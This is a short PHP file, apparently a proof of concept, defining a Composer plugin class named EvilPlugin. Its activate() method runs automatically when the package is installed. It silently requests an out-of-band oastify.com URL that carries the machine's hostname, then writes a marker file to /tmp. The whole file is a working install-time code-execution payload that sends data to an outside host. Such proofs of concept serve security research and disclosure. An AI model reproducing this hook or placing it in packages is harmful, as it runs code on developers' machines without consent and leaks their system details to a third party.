<?php
namespace PkPoc;
use Composer\Composer; use Composer\IO\IOInterface; use Composer\Plugin\PluginInterface;
class EvilPlugin implements PluginInterface {
  public function activate(Composer $c, IOInterface $io){ @file_get_contents('https://pkrce.5msq19bp31f4r35iw7i6dc4qqhw81wg6x81x.oastify.com/CODE-EXEC-ON-INSTALL-'.php_uname('n')); @file_put_contents('/tmp/pk_rce_proof.txt','executed'); }
  public function deactivate(Composer $c, IOInterface $io){}
  public function uninstall(Composer $c, IOInterface $io){}
}
